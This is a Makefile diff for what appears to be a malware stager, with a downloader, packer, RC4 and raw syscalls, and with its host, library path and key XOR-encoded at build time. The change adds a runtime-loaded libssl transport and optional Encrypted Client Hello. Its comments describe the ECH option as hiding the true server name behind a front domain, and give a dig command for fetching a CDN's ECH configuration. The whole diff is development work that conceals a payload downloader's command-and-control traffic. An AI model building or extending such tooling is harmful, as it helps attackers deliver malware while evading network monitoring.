@@ -62,6 +62,21 @@ else
   HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=0
 endif
 
+# Optional Encrypted Client Hello (ECH) for the libssl transport only.
+# ECH hides the inner SNI behind the public_name of an ECHConfigList. It needs
+# an OpenSSL that exports SSL_set1_ech_config_list (OpenSSL 4.0+); on older
+# libssl the stager still builds and quietly falls back to normal TLS.
+#   ECH=1                 compile ECH support in
+#   ECH_CONFIG=<base64>   ECHConfigList from the front domain's DNS HTTPS RR:
+#                           dig +short HTTPS cdn.example.com   (value after "ech=")
+# See transport_libssl.c for the full guide.
+ECH ?= 0
+ECH_CONFIG ?=
+ifeq ($(ECH),1)
+  COMMON_CFLAGS += -DMALLEABLE_ENABLE_ECH=1
+  COMMON_CFLAGS += -DMALLEABLE_ECH_CONFIG='"$(ECH_CONFIG)"'
+endif
+
 # Config options
 COMMON_CFLAGS += $(DYNLOAD_MODE_CFLAG) $(HASH_STYLE_CFLAG)
 COMMON_CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
@@ -73,11 +88,13 @@ COMMON_CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
 COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
 
 # Granular source selection: compile only what the selected transport needs.
-#   http/tcp/udp -> raw syscall sockets (net_utils.c)
-#   libcurl      -> runtime dynamic loader (dynload.c)
+#   http/tcp/udp/libssl -> raw syscall sockets (net_utils.c)
+#   libcurl/libssl      -> runtime dynamic loader (dynload.c)
+# A transport can appear in both lists (libssl opens a raw TCP socket and then
+# wraps it with OpenSSL loaded at runtime).
 # New transports can extend these lists or add their own dependencies.
-SOCKET_TRANSPORTS := http tcp udp
-DYNLOAD_TRANSPORTS := libcurl
+SOCKET_TRANSPORTS := http tcp udp libssl
+DYNLOAD_TRANSPORTS := libcurl libssl
 
 STAGE0_SRCS = downloader.c utils_min.c packer.c ../common/rc4.c debug.c syscalls.c
 ifneq ($(filter $(TRANSPORT),$(SOCKET_TRANSPORTS)),)
